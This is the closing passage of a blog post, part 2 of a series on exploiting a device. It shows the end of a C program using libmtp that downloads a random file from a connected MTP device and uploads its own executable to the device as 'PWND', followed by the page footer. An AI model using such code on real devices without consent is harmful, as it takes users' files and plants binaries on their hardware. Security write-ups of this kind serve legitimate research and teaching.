                                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">flist</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
                        <span class="n">reals</span> <span class="o">=</span> <span class="n">files_count</span><span class="p">(</span><span class="n">files</span><span class="p">);</span>
                        <span class="n">reals</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span><span class="o">%</span><span class="n">reals</span><span class="p">;</span>
                        <span class="n">f2</span> <span class="o">=</span> <span class="n">files</span><span class="p">;</span>
                        <span class="k">while</span> <span class="p">(</span><span class="n">f2</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">reals</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                                <span class="n">f2</span> <span class="o">=</span> <span class="n">f2</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
                                <span class="o">--</span><span class="n">reals</span><span class="p">;</span>
                        <span class="p">}</span>
                        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">f2</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
                                <span class="k">if</span> <span class="p">(</span><span class="n">f2</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'/'</span><span class="p">)</span>
                                        <span class="n">f2</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'_'</span><span class="p">;</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">LIBMTP_Get_File_To_File</span><span class="p">(</span><span class="n">device</span><span class="p">,</span>
                                                    <span class="n">f2</span><span class="o">-&gt;</span><span class="n">item_id</span><span class="p">,</span>
                                                    <span class="n">f2</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">,</span>
                                                    <span class="nb">NULL</span><span class="p">,</span>
                                                    <span class="nb">NULL</span><span class="p">))</span>
                                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">Error getting file.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
                        <span class="k">else</span>
                                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Downloaded file: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
                                       <span class="n">f2</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">);</span>
                        <span class="n">newfile</span> <span class="o">=</span> <span class="n">LIBMTP_new_file_t</span><span class="p">();</span>
                        <span class="n">newfile</span><span class="o">-&gt;</span><span class="n">filename</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="s">&quot;PWND&quot;</span><span class="p">);</span>
                        <span class="n">newfile</span><span class="o">-&gt;</span><span class="n">filesize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                        <span class="n">newfile</span><span class="o">-&gt;</span><span class="n">filetype</span> <span class="o">=</span> <span class="n">LIBMTP_FILETYPE_UNKNOWN</span><span class="p">;</span>
                        <span class="n">newfile</span><span class="o">-&gt;</span><span class="n">storage_id</span> <span class="o">=</span> <span class="n">f2</span><span class="o">-&gt;</span><span class="n">storage_id</span><span class="p">;</span>
                        <span class="n">newfile</span><span class="o">-&gt;</span><span class="n">parent_id</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">LIBMTP_Send_File_From_File</span><span class="p">(</span><span class="n">device</span><span class="p">,</span>
                                                       <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span>
                                                       <span class="n">newfile</span><span class="p">,</span>
                                                       <span class="nb">NULL</span><span class="p">,</span>
                                                       <span class="nb">NULL</span><span class="p">))</span>
                                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">Error sending file.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
                        <span class="k">else</span>
                                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">Uploaded file PWND on storage %x.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
                                       <span class="n">f2</span><span class="o">-&gt;</span><span class="n">storage_id</span><span class="p">);</span>
                        <span class="n">LIBMTP_destroy_file_t</span><span class="p">(</span><span class="n">newfile</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="n">destroy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fname</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">files</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">folders</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">flist</span><span class="p">,</span> <span class="n">fcount</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">LIBMTP_Release_Device_List</span><span class="p">(</span><span class="n">device_list</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre>

    </div>
    <p>This post is part of a series:</p>
    <ol class="parts">
            <li >
                <a href='https://derez.github.io/2017/device-exploitation.html'>How I exploited A - part&nbsp;1</a>
            </li>
            <li class="active">
                <a href='https://derez.github.io/2017/device-exploitation-2.html'>How I exploited A - part&nbsp;2</a>
            </li>
            <li >
                <a href='https://derez.github.io/2017/device-exploitation-3.html'>How I exploited A - part&nbsp;3</a>
            </li>
    </ol>
    <div class="divider"></div>
    <div class="article-details card-lower-corners">
      <div class="row">
        <div class="col l4 m4 s12">
          <div class="chip"><i class="black-text fa fa-folder fa-lg vertical-align-middle"></i>
            <a href="https://derez.github.io/category/exploitation.html"> exploitation</a>
          </div>
        </div>
        <div class="col l8 m8 s12">
          <div class="chip"><i class="fa fa-tag fa-lg vertical-align-middle black-text"></i>
            <a href="https://derez.github.io/tag/python.html"> python</a>
          </div>
          <div class="chip"><i class="fa fa-tag fa-lg vertical-align-middle black-text"></i>
            <a href="https://derez.github.io/tag/c.html"> C</a>
          </div>
          <div class="chip"><i class="fa fa-tag fa-lg vertical-align-middle black-text"></i>
            <a href="https://derez.github.io/tag/techniques.html"> techniques</a>
          </div>
        </div>
      </div>
      <div class="row">
        <div class="col s12">
          <span id="generated">Static site generated by <a href="https://getpelican.com">Pelican</a> in 
          <a href="https://www.python.org">Python</a> using <a href="https://jinja.pocoo.org">Jinja2.</a></span>

          <span id="copyright">&copy; Copyright 2016-2018
            &nbsp;Danny Walker
          </span>
        </div>
      </div>
    </div>

  </article>
        </div>
      </div>
    </main>

    <script src="https://derez.github.io/theme/vendor/jquery/jquery.min.js"></script>
    <script src="https://derez.github.io/theme/vendor/materialize/js/materialize.min.js"></script>

      <script src="https://derez.github.io/theme/js/current.js?ccf8b503"></script>
  </body>
</html>